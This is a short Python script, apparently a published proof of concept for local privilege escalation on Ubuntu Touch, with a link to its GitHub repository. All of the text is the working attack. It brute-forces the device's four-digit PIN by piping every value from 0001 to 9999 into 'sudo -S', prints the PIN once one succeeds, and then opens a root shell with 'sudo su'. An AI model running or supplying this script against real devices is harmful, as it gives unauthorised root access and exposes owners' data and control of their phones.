"""

Visit:
https://github.com/filipkarc/PoC-ubuntutouch-pin-privesc

"""

import os
import sys

x = 1
while x <= 9999:
    password = (str(x).zfill(4))
    result = os.system("echo {} | sudo -Si".format(password.strip()))
    if result == "0" or result == 0:
        print("\n\n\n===> PIN is: " + password + "\n\n\n")
        os.system("sudo id");
        os.system("sudo su");
        exit(0)
    x = x + 1
